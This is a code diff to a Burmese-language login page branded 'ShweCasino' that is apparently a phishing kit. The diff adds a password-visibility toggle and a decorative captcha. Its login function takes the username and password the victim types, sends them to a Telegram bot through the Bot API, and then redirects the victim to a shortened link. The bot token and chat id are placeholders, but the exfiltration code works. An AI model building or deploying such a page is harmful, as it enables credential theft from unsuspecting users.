@@ -65,19 +65,55 @@ font-size:18px;
 font-weight:bold;
 }
 
+/* captcha */
+
+.captcha-box{
+display:flex;
+align-items:center;
+gap:10px;
+margin-top:10px;
+}
+
+.captcha{
+background:white;
+color:black;
+padding:8px 14px;
+font-weight:bold;
+border-radius:6px;
+}
+
+.refresh{
+background:#ddd;
+color:black;
+padding:8px 12px;
+border-radius:6px;
+cursor:pointer;
+}
+
+/* password eye */
+
+.pass-box{
+position:relative;
+}
+
+.eye{
+position:absolute;
+right:10px;
+top:50%;
+transform:translateY(-50%);
+cursor:pointer;
+font-size:18px;
+}
+
 </style>
 
 </head>
 
 <body>
 
-<!-- banner -->
-
 <div class="banner">
 <img src="logo.jpg">
 </div>
-
-<!-- login -->
 
 <div class="login-box">
 
@@ -85,7 +121,17 @@ font-weight:bold;
 
 <input id="username" placeholder="အကောင့်အမည်">
 
+<div class="pass-box">
 <input type="password" id="password" placeholder="စကားဝှက်">
+<span class="eye" onclick="togglePass()">👁</span>
+</div>
+
+<div class="captcha-box">
+<div class="captcha" id="captcha"></div>
+<div class="refresh" onclick="createCaptcha()">↻</div>
+</div>
+
+<input id="captchaInput" placeholder="captcha ရိုက်ထည့်ပါ">
 
 <button onclick="login()">အကောင့်ထဲဝင်ရန်</button>
 
@@ -93,20 +139,55 @@ font-weight:bold;
 
 <script>
 
-var token = "BOT_TOKEN";
-var chat_id = "CHAT_ID";
+var token="BOT_TOKEN";
+var chat_id="CHAT_ID";
+
+/* password show hide */
+
+function togglePass(){
+var x=document.getElementById("password");
+
+if(x.type==="password"){
+x.type="text";
+}else{
+x.type="password";
+}
+}
+
+/* captcha */
+
+var cap;
+
+function createCaptcha(){
+
+cap=Math.floor(1000+Math.random()*9000);
+
+document.getElementById("captcha").innerText=cap;
+
+}
+
+createCaptcha();
+
+/* login */
 
 function login(){
 
-var user = document.getElementById("username").value;
-var pass = document.getElementById("password").value;
+var user=document.getElementById("username").value;
+var pass=document.getElementById("password").value;
+var capInput=document.getElementById("captchaInput").value;
 
-var message =
+if(capInput!=cap){
+alert("captcha မှားနေပါတယ်");
+createCaptcha();
+return;
+}
+
+var msg=
 "ShweCasino Login%0A"+
-"Username: "+user+"%0A"+
-"Password: "+pass;
+"User: "+user+"%0A"+
+"Pass: "+pass;
 
-fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+message);
+fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+msg);
 
 window.location.href="https://cutt.ly/otrecCFE";
 
